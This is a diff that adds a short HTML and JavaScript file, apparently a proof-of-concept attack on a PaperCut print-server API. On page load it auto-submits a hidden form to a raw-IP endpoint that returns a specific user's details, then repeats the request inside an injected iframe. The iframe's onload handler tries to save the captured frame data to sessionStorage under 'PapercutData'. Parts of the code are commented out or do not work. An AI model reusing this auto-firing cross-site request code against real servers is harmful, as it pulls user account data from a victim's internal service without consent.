@@ -1,0 +1,30 @@
+<script src="https://code.jquery.com/jquery-1.9.1.min.js"></script>
+<form id="myform" method="get" action="http://163.13.21.18:9191/rpc/api/web/user/403850398/details.json"></form><script>(function() {document.getElementById("myform").submit();})();</script>
+
+
+ // var form = document.createElement("form");
+		   //  form.id 	= "myform";
+		   //  form.method = "GET";
+		   //  form.action = "http://163.13.21.18:9191/rpc/api/web/user/403850398/details.json";   
+
+
+
+
+		var frame = document.createElement("iframe");
+		frame.id ="myframe";
+		frame.srcdoc = '<form id="myform" method="get" action="http://163.13.21.18:9191/rpc/api/web/user/403850398/details.json"></form><script>(function() {document.getElementById("myform").submit();})();</script>';
+		//frame.setAttribute('style', 'display:none;');
+		frame.onload = function(event) { 
+			// console.info('load', event); 
+			// alert(document.body.getElementById("pre"));
+
+			sessionStorage.setItem("PapercutData", console.dir(this));
+			//console.log(this.contentWindow.document.innerHTML);
+
+
+			
+		};
+		// frame.onerror = function(err) { console.info('error', err); };
+		document.body.appendChild(frame);
+
+		// console.log(frame);
